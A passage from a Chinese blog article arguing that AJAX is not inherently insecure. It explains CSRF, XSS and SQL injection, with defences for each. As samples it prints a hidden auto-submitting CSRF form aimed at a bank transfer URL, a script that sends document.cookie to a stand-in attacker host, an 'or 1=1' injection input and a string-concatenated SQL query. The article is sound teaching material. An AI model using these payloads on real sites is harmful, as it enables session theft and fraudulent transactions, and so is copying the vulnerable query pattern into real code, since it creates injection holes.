---
title: 'AJAX请求真的不安全么？谈谈Web安全与AJAX的关系。' 
date: 2018-12-19 2:30:07
hidden: true
slug: eniq8yfn2vm
categories: [reprint]
---

{{< raw >}}

                    
<h2 id="articleHeader0">开篇三问</h2>
<ol>
<li>AJAX请求真的不安全么？</li>
<li>AJAX请求哪里不安全？</li>
<li>怎么样让AJAX请求更安全？</li>
</ol>
<h2 id="articleHeader1">前言</h2>
<p>本文包含的内容较多，包括AJAX，CORS，XSS，CSRF等内容，要完整的看完并理解需要付出一定的时间。</p>
<p><em>另外，见解有限，如有描述不当之处，请帮忙及时指出。</em></p>
<p><strong>正文开始...</strong></p>
<p>从入坑前端开始，一直到现在，AJAX请求都是以极高的频率重复出现，也解决过不少AJAX中遇到的问题，如跨域调试，错误调试等等。</p>
<p>从这种，发现了一个共通现象：<strong>那就是每次和后台人员对接时，他们都会提到<code>AJAX请求不安全</code>，请用普通http请求！</strong></p>
<p>虽然很多时候，都是经过多翻口舌之争后，最终后台那边妥协，允许部分符合条件的AJAX请求。但是，我却很纠结一个问题：<strong>AJAX请求真的不安全么？为什么我自己写后台时并没有发现这个问题？</strong></p>
<p>于是，开始准备搜集资料，结合自己已有的认知，整理成一份解决方案，分析<code>AJAX请求真的不安全么？哪里不安全？</code>，后续遇到类似的问题就直接<strong>向对方抛出一篇文章</strong></p>
<h2 id="articleHeader2">大纲</h2>
<ul>
<li>
<p>AJAX请求真的不安全么</p>
<ul><li>AJAX不安全的说法从何而来</li></ul>
</li>
<li>
<p>常见的几种Web前端安全问题</p>
<ul>
<li>CSRF简介</li>
<li>CSRF与AJAX的关系</li>
<li>XSS简介</li>
<li>XSS与AJAX的关系</li>
<li>SQL注入简介</li>
<li>SQL注入与AJAX的关系</li>
</ul>
</li>
<li>AJAX和HTTP请求的区别</li>
<li>
<p>CORS与AJAX安全性之间的关联</p>
<ul>
<li>CORS与AJAX关系的简介</li>
<li>为什么要配置CORS？</li>
<li>CORS会配置些什么信息？</li>
<li>CORS <code>Origin: *</code>的安全性</li>
</ul>
</li>
<li>再看，AJAX请求真的不安全么？</li>
<li>AJAX请求哪里不安全？</li>
<li>怎么样让AJAX请求更安全？</li>
</ul>
<h2 id="articleHeader3">AJAX请求真的不安全么</h2>
<p>首先，先说一个定论：<code>AJAX请求是否安全，由服务端（后台）决定</code></p>
<p>有这样一个说法：<strong>如果某个Web应用具备良好的安全性，那么再怎么用“不安全的AJAX”也削弱不了它的安全性，反之如果应用本身存在漏洞，不管用何种技术请求，它都是不安全的</strong></p>
<p><span class="img-wrap"><img data-src="/img/remote/1460000012693839?w=495&amp;h=601" src="https://static.alili.tech/img/remote/1460000012693839?w=495&amp;h=601" alt="" title="" style="cursor: pointer; display: inline;"></span></p>
<p>为何会有这种说法？<strong>因为在Web应用中，客户端输入不可信是一个基本原则</strong></p>
<h3 id="articleHeader4">AJAX不安全的说法从何而来？</h3>
<p>在AJAX出现时，那时的服务端还是很古老的那一批，因此完全没有考虑到AJAX出现后，前端请求方式会变得异常复杂，造成以前的安全策略已经无法满足要求了，导致大批的后台安全漏洞曝光。。。</p>
<p>很显然，都是因为AJAX出现后曝光了更多的安全漏洞，导致它看起来很危险（因为AJAX出现后，请求方式变多了，以前的架构在新的请求中就可能出现更多漏洞）</p>
<p>So，AJAX不安全的说法自然扩散到了各个角落。</p>
<h2 id="articleHeader5">常见的几种Web前端安全问题</h2>
<p>要知道AJAX请求是否安全，那么就得先知道Web前端中到底有那几种安全问题</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="1.XSS（跨站脚本攻击）（cross-site scripting）

    -> 伪造会话（基于XSS实现CSRF）
    
    -> 劫持cookie
    
    -> 恶意代码执行

2.CSRF（跨站请求伪造）（cross-site request forgery）

    -> 伪造用户身份操作
    
3. SQL注入

...（其它暂且不提）" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="javascript hljs"><code class="js"><span class="hljs-number">1.</span>XSS（跨站脚本攻击）（cross-site scripting）

    -&gt; 伪造会话（基于XSS实现CSRF）
    
    -&gt; 劫持cookie
    
    -&gt; 恶意代码执行

<span class="hljs-number">2.</span>CSRF（跨站请求伪造）（cross-site request forgery）

    -&gt; 伪造用户身份操作
    
<span class="hljs-number">3.</span> SQL注入

...（其它暂且不提）</code></pre>
<p><span class="img-wrap"><img data-src="/img/remote/1460000012693782?w=803&amp;h=428" src="https://static.alili.tech/img/remote/1460000012693782?w=803&amp;h=428" alt="" title="" style="cursor: pointer;"></span></p>
<p>如上，Web前端中的安全问题主要就是这几大类（仅列举部分做分析），所以我们首先要分析AJAX与这几大类之间的关系。（<code>XSS</code>和<code>CSRF</code>，在下文也会做简单介绍。）</p>
<h3 id="articleHeader6">CSRF简介</h3>
<p>CSRF，特征很简单：<strong>冒用用户身份，进行恶意操作</strong></p>
<p>时至今日，这项安全漏洞已经被人们剖析的很透彻了，随便Google，百度之，都会找到很多的解释。这里也用一张图来先做简单描述：</p>
<p>（注，下面介绍参考了来源文章中的描述，譬如图就是参考了来源中的博文后重绘的）</p>
<p><span class="img-wrap"><img data-src="/img/remote/1460000012693783?w=904&amp;h=739" src="https://static.alili.tech/img/remote/1460000012693783?w=904&amp;h=739" alt="" title="" style="cursor: pointer;"></span></p>
<p>所以，我们看到关键条件是：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="1. 采用cookie来进行用户校验

2. 登录受信任网站A，并在本地生成Cookie

3. 在不登出A的情况下，访问危险网站B" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="javascript hljs"><code class="js"><span class="hljs-number">1.</span> 采用cookie来进行用户校验

<span class="hljs-number">2.</span> 登录受信任网站A，并在本地生成Cookie

<span class="hljs-number">3.</span> 在不登出A的情况下，访问危险网站B</code></pre>
<p>一般在<code>(4)</code>处<code>恶意网站(B)</code>的攻击手段如下（必须是指向<code>A</code>的地址，否则无法带上cookie）：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="// 1.譬如在网站内的图片资源中潜入恶意的转账操作
<img src=http://www.bank.example/transfer?toBankId=hello&amp;amount=1000000 width='0' height='0'>

// 2.构建恶意的隐藏表单，并通过脚本提交恶意请求
<iframe style=&quot;display: none;&quot; name=&quot;csrf-frame&quot;></iframe>
<form method='POST' action='http://www.bank.example/transfer' target=&quot;csrf-frame&quot; id=&quot;csrf-form&quot;>
  <input type='hidden' name='toBankId' value='hello'>
  <input type='hidden' name='amount' value='1000000'>
  <input type='submit' value='submit'>
</form>
<script>document.getElementById(&quot;csrf-form&quot;).submit()</script>" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="xml hljs"><code class="html">// 1.譬如在网站内的图片资源中潜入恶意的转账操作
<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://www.bank.example/transfer?toBankId</span>=<span class="hljs-string">hello&amp;amount</span>=<span class="hljs-string">1000000</span> <span class="hljs-attr">width</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">height</span>=<span class="hljs-string">'0'</span>&gt;</span>

// 2.构建恶意的隐藏表单，并通过脚本提交恶意请求
<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"display: none;"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"csrf-frame"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">'POST'</span> <span class="hljs-attr">action</span>=<span class="hljs-string">'http://www.bank.example/transfer'</span> <span class="hljs-attr">target</span>=<span class="hljs-string">"csrf-frame"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"csrf-form"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">'hidden'</span> <span class="hljs-attr">name</span>=<span class="hljs-string">'toBankId'</span> <span class="hljs-attr">value</span>=<span class="hljs-string">'hello'</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">'hidden'</span> <span class="hljs-attr">name</span>=<span class="hljs-string">'amount'</span> <span class="hljs-attr">value</span>=<span class="hljs-string">'1000000'</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">'submit'</span> <span class="hljs-attr">value</span>=<span class="hljs-string">'submit'</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"csrf-form"</span>).submit()</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>
<p>而且，从头到尾，攻击网站都没有获取到过 cookie，都是通过浏览器间接实现（利用Web的cookie隐式身份验证机制），所以<code>HttpOnly</code>并不会影响这个攻击</p>
<p>最后说下，几种常见的CSRF防御手段：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="1. 验证HTTP Referer字段（非常简单，但是鉴于客户端并不可信任，所以并不是很安全）
（防止CSRF，检查Referer字段简单直接，但是其完全依赖浏览器发送正确的Referer字段。
虽然http协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，
亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其Referer字段的可能。）

2. 在请求地址中添加token并验证
（譬如post中，以参数的形式加入一个随机产生的token）" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="javascript hljs"><code class="js"><span class="hljs-number">1.</span> 验证HTTP Referer字段（非常简单，但是鉴于客户端并不可信任，所以并不是很安全）
（防止CSRF，检查Referer字段简单直接，但是其完全依赖浏览器发送正确的Referer字段。
虽然http协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，
亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其Referer字段的可能。）

<span class="hljs-number">2.</span> 在请求地址中添加token并验证
（譬如post中，以参数的形式加入一个随机产生的token）</code></pre>
<h3 id="articleHeader7">CSRF与AJAX的关系</h3>
<p>上文中，我们看到CSRF的前提是cookie验证用户身份，那么它与AJAX的关系大么？</p>
<p>我们先分析AJAX中带cookie验证的情况：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="1. AJAX受到浏览器的同源策略限制

2. AJAX默认无法请求跨域的接口
（当然后台可以配置`Access-Control-Allow-Origin: *`之类的允许所有的跨域请求）

3. AJAX请求无法携带跨域cookie
（如果强行开启withCredentials，必须服务端配合认证，无法用作攻击）" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="javascript hljs"><code class="js"><span class="hljs-number">1.</span> AJAX受到浏览器的同源策略限制

<span class="hljs-number">2.</span> AJAX默认无法请求跨域的接口
（当然后台可以配置<span class="hljs-string">`Access-Control-Allow-Origin: *`</span>之类的允许所有的跨域请求）

<span class="hljs-number">3.</span> AJAX请求无法携带跨域cookie
（如果强行开启withCredentials，必须服务端配合认证，无法用作攻击）</code></pre>
<p>嗯哼...看到这，基本就可以认为CSRF与AJAX请求无缘了。。。</p>
<p>譬如假设上图中第<code>4</code>部分的请求由AJAX发起，假设网站A已经允许了<code>Access-Control-Allow-Origin: *</code>，由于网站B与网站A是不同域名，所以存在跨域，根据同源策略，请求时根本就无法携带cookie，故而无法通过身份认证，攻击失败。。。<br>就算强行开启withCredentials，携带跨域cookie，但是由于服务端并不会单独配置网站B的跨域cookie（需配置<code>Access-Control-Allow-Credentials: true</code>，而且这时候不允许设置<code>Allow-Origin: *</code>），所以肯定认证失败</p>
<p>可以看到，就算<code>Access-Control-Allow-Origin: *</code>允许所有来源的AJAX请求，跨域的cookie默认情况下仍然是无法携带的，无法CSRF</p>
<p>所以说，结论是：<strong>CSRF与AJAX无关</strong></p>
<h3 id="articleHeader8">XSS简介</h3>
<p>既然CSRF与AJAX关系不大，那么XSS应该会与AJAX有很大关系吧？（要不然为什么一直说AJAX请求不安全，对吧。）。那么请继续看下去（本文中只限JS范畴）</p>
<p>XSS（cross-site scripting），看起来简写应该是css更合适。。。但是为了和层叠式样式表区分，就用XSS简写表示</p>
<p>XSS的特征也可以概括为：<strong>跨域脚本注入，攻击者通过某种方式将恶意代码注入到网页上，然后其他用户观看到被注入的页面内容后会受到特定攻击</strong></p>
<p>相比CSRF，XSS囊括的内容更多，而且往往是多种攻击形式组合而成，这里以前文中介绍的几种为例：</p>
<p><span class="img-wrap"><img data-src="/img/remote/1460000012693784?w=371&amp;h=430" src="https://static.alili.tech/img/remote/1460000012693784?w=371&amp;h=430" alt="" title="" style="cursor: pointer;"></span></p>
<p><strong>1.cookie劫持</strong></p>
<p>同样，页面中有一个评论输入，输入后会，因为后台的漏洞，没有过滤特殊字符，会直接明文保存到数据库中，然后展示到网页时直接展示明文数据，那么如下</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="<%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%>
<form action=&quot;saveComment.jsp&quot; method=&quot;post&quot;> 
     请输入评论内容：<BR> 
     <input name=&quot;content&quot; type=&quot;text&quot;> 
     <input type=&quot;submit&quot; value=&quot;确认&quot;>
</form> " title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="xml hljs"><code class="html"><span class="hljs-tag">&lt;<span class="hljs-name">%@</span> <span class="hljs-attr">page</span> <span class="hljs-attr">language</span>=<span class="hljs-string">"java"</span> <span class="hljs-attr">contentType</span>=<span class="hljs-string">"text/html; charset=UTF-8"</span> <span class="hljs-attr">pageEncoding</span>=<span class="hljs-string">"UTF-8"</span>%&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"saveComment.jsp"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"post"</span>&gt;</span> 
     请输入评论内容：<span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span> 
     <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"content"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span>&gt;</span> 
     <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"确认"</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span> </code></pre>
<p>然后攻击者分析后，输入</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="<script>window.open(&quot;http://www.attackpage.com/record?secret=&quot; + document.cookie)</script>" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="xml hljs"><code class="html" style="word-break: break-word; white-space: initial;"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">window</span>.open(<span class="hljs-string">"http://www.attackpage.com/record?secret="</span> + <span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>
<p>保存文章。很简单的代码，由于没有过滤脚本，那么其它用户登陆后，在看到这篇文章时就会自动将他们的cookie信息都发送到了攻击者的服务器。<br>攻击者可以在cookie（譬如jsessionid对应的session）有效期内拿它们冒充用户操作。</p>
<p>需要注意，这里和CSRF的区别是，这里是拿到了cookie后主动冒充用户的，而CSRF中根本就不知cookie，仅利用浏览器的隐式校验方式冒充用户。</p>
<p><strong>2.会话伪造</strong></p>
<p>同样是评论漏洞的示例。</p>
<p>攻击者输入（举例比喻）</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="<img src=http://www.bank.example/transfer?toBankId=hello&amp;amount=1000000 width='0' height='0'>" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="xml hljs"><code class="html" style="word-break: break-word; white-space: initial;"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://www.bank.example/transfer?toBankId</span>=<span class="hljs-string">hello&amp;amount</span>=<span class="hljs-string">1000000</span> <span class="hljs-attr">width</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">height</span>=<span class="hljs-string">'0'</span>&gt;</span></code></pre>
<p>然后，接下来发生的故事就和CSRF中提到的一致。这种情况就是基于XSS而开展的CSRF，也有人喜欢称之为XSRF</p>
<p>需要注意，这里并没有自己拿到cookie，而是CSRF中提到的利用浏览器的隐式验证机制来冒充用户。</p>
<p><strong>3.其它恶意代码执行</strong></p>
<p>其实上面的cookie劫持以及会话伪造都算是恶意代码执行，为了区别，这里就专指前端的流氓JS。</p>
<p>譬如前面的评论中的输入可以是：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="譬如市面上盛行的网页游戏弹窗等。
譬如干脆直接让这个页面卡死都可以。
譬如无限循环。" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="javascript hljs"><code class="js">譬如市面上盛行的网页游戏弹窗等。
譬如干脆直接让这个页面卡死都可以。
譬如无限循环。</code></pre>
<p>这里再提一点，上述都是从前端输入作为入口的，但实际上有一类的输入也不可忽视，那就是：<code>富文本攻击</code></p>
<p>它的特点就是： <strong>富文本中注入了脚本，并且前后端未进行过滤，导致直接输出到了页面中</strong></p>
<p>因为存在很多页面，都是将富文本内容展示到网页上的，没有进行过滤（哪怕时至今日，仍然有不少页面），这样只要富文本中有注入脚本，基本就中招了。。。</p>
<p><strong>结论：</strong></p>
<p><strong>只要最终能向页面输出可执行的脚本语句，那么就是有漏洞，XSS攻击都有可能发生。</strong></p>
<p>而且，基本上xss漏洞是很广泛的，虽然攻击类型很被动，也需要大量时间分析，但胜在大量的网站上都存在（特别是那种长期不更新的）</p>
<p>再提一点。上述的介绍更多的是从造成的后果来看，但其实如果从攻击手动来看的话可以分为几大类型：<code>反射型XSS攻击</code>（直接通过URL注入，而且很多浏览器都自带防御），<code>存储型XSS攻击</code>（存储到DB后读取时注入），还有一个<code>DOM-Based型</code>。</p>
<p>上述示例中都是存储型，具体更多内容网上已经有很详细的资料，这里不再继续深入，放一张图巩固下。</p>
<p><span class="img-wrap"><img data-src="/img/remote/1460000012693785?w=1031&amp;h=767" src="https://static.alili.tech/img/remote/1460000012693785?w=1031&amp;h=767" alt="" title="" style="cursor: pointer;"></span></p>
<p><strong>如何预防XSS：</strong></p>
<ul><li>输入过滤，不信任用户的任何输入，过滤其中的“&lt;”、“&gt;”、“/”等可能导致脚本注入的特殊字符，</li></ul>
<p>或者过滤“script”、“javascript”等脚本关键字，或者对输入数据的长度进行限制等等，<br>还得考虑攻击者使用十六进制编码来输入脚本的方式。</p>
<ul>
<li>输出进行编码，和输入过滤类似，不过是从输出上着手，数据输出到页面时，经过HtmlEncoder等工具编码，这样就不会存在直接输出可执行的脚本了</li>
<li>cookie设置<code>http-only</code>，这样用脚本就无法获取cookie了</li>
</ul>
<p>（这样只有浏览器向Web服务器发起请求的时才会带上cookie字段，避免了XSS攻击利用JavaScript的document.cookie获取cookie）</p>
<ul><li>Cookie防盗，尽可能地避免在Cookie中泄露隐私，如用户名、密码等；</li></ul>
<p>或者，为了防止重放攻击，可以将Cookie和IP进行绑定，这样也可以阻止攻击者冒充正常用户的身份。</p>
<ul><li>注意，特别是后台，一定不能信任前端的输入，需要过滤与校验</li></ul>
<h3 id="articleHeader9">XSS与AJAX的关系</h3>
<p>以上分析了XSS造成一些影响与问题，仍然发现：<strong>与AJAX关系不大</strong>，因为这些问题不管用不用AJAX都会发生。</p>
<p>看看这种情况，譬如上述的富文本注入中：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="1. 某个接口采用AJAX交互

2. AJAX请求完后将对应富文本字段显示到了页面上-譬如innerHTML" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="javascript hljs"><code class="js"><span class="hljs-number">1.</span> 某个接口采用AJAX交互

<span class="hljs-number">2.</span> AJAX请求完后将对应富文本字段显示到了页面上-譬如innerHTML</code></pre>
<p>但是，这真的与AJAX无关，这是前后端没有进行输入输出过滤而造成的后果。</p>
<p>所以，还是那句话：<strong>如果某个Web应用具备良好的安全性，那么再怎么用“不安全的AJAX”也削弱不了它的安全性，反之如果应用本身存在漏洞，不管用何种技术请求，它都是不安全的</strong></p>
<h3 id="articleHeader10">SQL注入简介</h3>
<p>sql注入展开将也是一门很大的学问，很早以前更是大行其道（当然，现在...），这里仅仅举几个最极端的示例。</p>
<p><strong>前提是后台没有过滤前端的输入数据，否则根本无法生效</strong></p>
<p>假设页面A中有一个登陆查询存在拙劣的sql注入漏洞，这样子的：（最极端，最傻的情况）</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="<%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%>
<form action=&quot;login.jsp&quot; method=&quot;post&quot;> 
     请输入用户名与密码：<BR> 
     <input name=&quot;name&quot; type=&quot;text&quot;> 
     <input name=&quot;password&quot; type=&quot;text&quot;> 
     <input type=&quot;submit&quot; value=&quot;登陆&quot;>
</form> " title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="xml hljs"><code class="html"><span class="hljs-tag">&lt;<span class="hljs-name">%@</span> <span class="hljs-attr">page</span> <span class="hljs-attr">language</span>=<span class="hljs-string">"java"</span> <span class="hljs-attr">contentType</span>=<span class="hljs-string">"text/html; charset=UTF-8"</span> <span class="hljs-attr">pageEncoding</span>=<span class="hljs-string">"UTF-8"</span>%&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"login.jsp"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"post"</span>&gt;</span> 
     请输入用户名与密码：<span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span> 
     <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"name"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span>&gt;</span> 
     <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"password"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span>&gt;</span> 
     <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"登陆"</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span> </code></pre>
<p>在接收到登陆请求后，服务端的实际执行代码时是：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="String sql = &quot;SELECT * FROM  users  WHERE name = '&quot; + name + &quot;' AND password = '&quot; + password + &quot;'&quot;;" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="javascript hljs"><code class="js" style="word-break: break-word; white-space: initial;"><span class="hljs-built_in">String</span> sql = <span class="hljs-string">"SELECT * FROM  users  WHERE name = '"</span> + name + <span class="hljs-string">"' AND password = '"</span> + password + <span class="hljs-string">"'"</span>;</code></pre>
<p>然而有攻击者分析出后台可能存在漏洞，尝试sql注入攻击，输入</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="name = ''
password = ''  or 1=1" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="javascript hljs"><code class="js">name = <span class="hljs-string">''</span>
password = <span class="hljs-string">''</span>  or <span class="hljs-number">1</span>=<span class="hljs-number">1</span></code></pre>
<p>那么这样，后台接收到数据后，实际上查询的结果是</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="SELECT * FROM  users  WHERE name = '''' AND password = ''''  or 1=1  " title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="javascript hljs"><code class="js" style="word-break: break-word; white-space: initial;">SELECT * FROM  users  WHERE name = <span class="hljs-string">''</span><span class="hljs-string">''</span> AND password = <span class="hljs-string">''</span><span class="hljs-string">''</span>  or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>  </code></pre>
<p>故而，攻击者成功的绕过的用户名，利用后台漏洞登陆了。</p>
<p>当然了，像这类这么低级的漏洞，现象几乎已经不存在了，往往这类型漏洞需要仔细分析，耗时。（又或者是有内奸。。。）</p>
<p><strong>修正内容：</strong></p>
<p>以前是将<code>or</code>语句放在<code>name</code>中，修正后放在<code>password</code>中，因为放name中只能匹配到和输入password相符合的，但是放password中，能匹配所有。</p>
<h3 id="articleHeader11">SQL注入与AJAX的关系</h3>
<p>额，从上述的示例中看不出和AJAX有什么关系。但是我们可以这样假设：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="1. 有一个接口，接收AJAX post的数据

2. 数据中有一个字段 'name'，后台接收到后没有进行过滤，直接如上面的演示一样，执行sql语句了

3. 所以AJAX中如果给那个字段传入非法的注入信息，就会触发这个漏洞，导致攻击生效" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="javascript hljs"><code class="js"><span class="hljs-number">1.</span> 有一个接口，接收AJAX post的数据
